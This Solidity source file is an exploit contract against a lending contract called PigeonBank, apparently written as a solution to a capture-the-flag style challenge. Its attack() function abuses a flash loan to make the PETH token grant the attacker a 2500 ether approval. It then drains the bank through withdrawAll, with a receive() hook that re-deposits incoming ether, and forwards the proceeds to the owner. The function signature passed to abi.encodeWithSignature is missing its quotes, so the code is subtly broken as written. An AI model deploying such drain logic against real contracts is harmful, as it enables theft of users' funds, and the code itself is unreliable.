// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./PETH.sol";
import "./PigeonBank.sol";

contract Attack
{
    PigeonBank public pigeonBank;
    address owner;

    constructor(address _pigeonBankAddress) {
        pigeonBank = PigeonBank(payable(_pigeonBankAddress));
        owner = msg.sender;
    }

    function attack() public payable {
        pigeonBank.flashLoan(pigeonBank.peth(), abi.encodeWithSignature(approve(address,uint256), address(this), 2500 ether));
        pigeonBank.withdrawAll();
        owner.call{value: address(this).balance}("");
    }

    receive() external payable {
        pigeonBank.deposit{value: msg.value}();
    }
}